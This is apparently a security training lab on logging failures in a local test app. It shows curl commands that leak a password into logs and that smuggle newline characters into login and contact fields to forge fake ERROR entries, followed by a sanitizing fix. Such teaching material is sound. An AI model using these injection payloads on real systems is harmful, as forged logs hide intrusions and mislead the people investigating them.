# Lab 10: Secrets in logs + log injection

The login handler and the contact form print user input to the log raw — so a password lands in the log, and a newline in the input forges log lines.

**OWASP Top 10:2025:** [A09 Security Logging and Monitoring Failures](https://owasp.org/Top10/2025/)

**Code:** `routes/auth.js` (`console.log` in `/login/auth`), `routes/pages.js` (`console.log` in `/contact`)

## Exploit 1: password in logs

```bash
curl -s -X POST http://localhost:8888/login/auth -H "Content-Type: application/x-www-form-urlencoded" \
  --data "username=alice&password=S3cret!" -o /dev/null

docker compose logs web | grep "login attempt" | tail -1
# [auth] login attempt user=alice password=S3cret!
```

Anyone with log access (ops, log shipping, CI) now has live credentials.

## Exploit 2: log forging with CRLF

URL-encode a newline (`%0A`) into the username:

```bash
curl -s -X POST http://localhost:8888/login/auth -H "Content-Type: application/x-www-form-urlencoded" \
  --data "username=alice%0A%5B2026-09-07%2012%3A00%3A00%5D%20ERROR%20fake-critical-event%20user=admin%20action=disable-2fa&password=wrong" -o /dev/null

docker compose logs web | grep -A1 "login attempt user=alice"
# [auth] login attempt user=alice
# [2026-09-07 12:00:00] ERROR fake-critical-event user=admin action=disable-2fa password=wrong
```
A fake log entry an analyst would treat as real — planted evidence, alert pollution, or hiding real activity in the noise.

The same works from the public **Contact** page — no login required:

```bash
curl -s -X POST http://localhost:8888/contact -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "email=a@b.com" --data-urlencode $'hello\n[2026-09-07 12:00:00] ERROR fake-critical-event user=admin'

docker compose logs web | grep -A1 "\[contact\]"
# [contact] from=a@b.com message=hello
# [2026-09-07 12:00:00] ERROR fake-critical-event user=admin
```

## Why it happens

Logs are treated as debug output, not as a security boundary. Two rules broken: never log secrets, never trust user input in log records.

## Fix

```js
// 1. never log secrets; log identifiers only
console.log(`[auth] login attempt user=${sanitize(user)}`, { ip: req.ip, ok: false });

// 2. sanitize: strip control characters (0x00-0x1f, 0x7f) from anything that
//    reaches a log line, or use a structured logger (pino, bunyan) that
//    escapes newlines by writing JSON records
const sanitize = (s) => String(s).replace(/[\x00-\x1f\x7f]/g, "_");
```

Also: rate-limit auth failures and emit one alert per burst — logging failures without alerting is the other half of A09.

## Verify

After the fix, the password never appears in logs, and a `%0A` username renders as `alice_N[2026-...` — a single line, visibly mangled.